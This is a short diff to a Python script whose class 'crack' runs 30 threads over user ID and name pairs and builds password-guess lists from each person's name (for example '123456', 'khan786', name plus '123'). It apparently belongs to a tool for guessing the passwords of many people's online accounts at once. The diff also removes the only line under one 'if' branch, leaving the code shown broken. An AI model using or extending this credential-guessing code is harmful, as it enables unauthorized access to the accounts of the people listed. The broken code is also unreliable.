@@ -688,11 +688,10 @@ class crack:
 		with khamdihiXD(max_workers=30) as dihi:
 			for me in self.id:
 				try:
-					uid, name = nama.split('<=>')
+					uid, name = me.split('<=>')
 					sempak = name.split(' ')
-					nun = gas[0]
+					nun = sempak[0]
 					if len(nun)>=6:
-						pwx = ['123456','khan','786786','khan123','Khan12','fullname12']
 					elif len(nun)<=1:
 						pwx = [nun, nun+'123', nun+'1234', nun+'12', nun+'786', name]
 					elif len(nun)<=2:
